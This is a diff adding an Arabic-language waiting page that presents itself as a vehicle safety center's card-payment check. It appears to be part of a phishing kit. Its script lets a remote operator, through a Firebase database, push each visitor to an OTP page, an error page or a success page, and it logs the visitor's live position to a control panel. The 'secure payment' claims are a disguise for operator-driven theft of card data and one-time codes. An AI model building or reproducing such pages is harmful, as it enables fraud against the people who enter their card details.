@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري المعالجة - مركز سلامة المركبات</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root {
+            --main-green: #1e7344;
+            --bg-light: #f7f8fa;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        
+        body { 
+            background-color: var(--bg-light); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .loading-container {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 25px;
+            padding: 40px 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            text-align: center;
+        }
+
+        /* دائرة التحميل الخضراء */
+        .spinner {
+            width: 65px;
+            height: 65px;
+            border: 6px solid #e0e0e0;
+            border-top: 6px solid var(--main-green);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: bold; }
+        p { font-size: 15px; color: #666; line-height: 1.8; margin-bottom: 20px; }
+
+        .secure-badge-container {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* تنسيق الصورة التي أرسلتها */
+        .secure-img {
+            width: 100%;
+            max-width: 220px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        .secure-text { font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <h2>جاري معالجة الطلب...</h2>
+        <p>
+            يرجى الانتظار، نحن نقوم بالتحقق من بيانات البطاقة لضمان عملية دفع آمنة. <br>
+            <strong>لا تقم بإغلاق الصفحة أو تحديثها.</strong>
+        </p>
+
+        <div class="secure-badge-container">
+            <img src="https://i.ibb.co/rKgZj74W/IMG-20260323-WA0008.jpg" class="secure-img" alt="Secure Payment">
+            <span class="secure-text">دفع آمن ومحمي بموجب المعايير الدولية</span>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات Firebase
+        const firebaseConfig = { 
+            apiKey: "AIzaSyAzXXXXXXXXXXXX", 
+            databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", 
+            projectId: "vsc-project" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const visitorId = localStorage.getItem('visitorId');
+
+        if (visitorId) {
+            const statusRef = database.ref('payments/' + visitorId);
+            
+            // مراقبة الحالة لحظياً للتحويل التلقائي
+            statusRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.status) {
+                    if (data.status === "otp") {
+                        window.location.href = 'otp.html';
+                    } else if (data.status === "error") {
+                        window.location.href = 'payment.html?error=1';
+                    } else if (data.status === "success") {
+                        window.location.href = 'success.html';
+                    }
+                }
+            });
+
+            // تحديث موقع الزائر الحالي في لوحة التحكم
+            database.ref('live_visitors/' + visitorId).update({
+                page: "انتظار المعالجة (Loading)",
+                last_active: firebase.database.ServerValue.TIMESTAMP
+            });
+        } else {
+            window.location.href = 'payment.html';
+        }
+    </script>
+</body>
+</html>
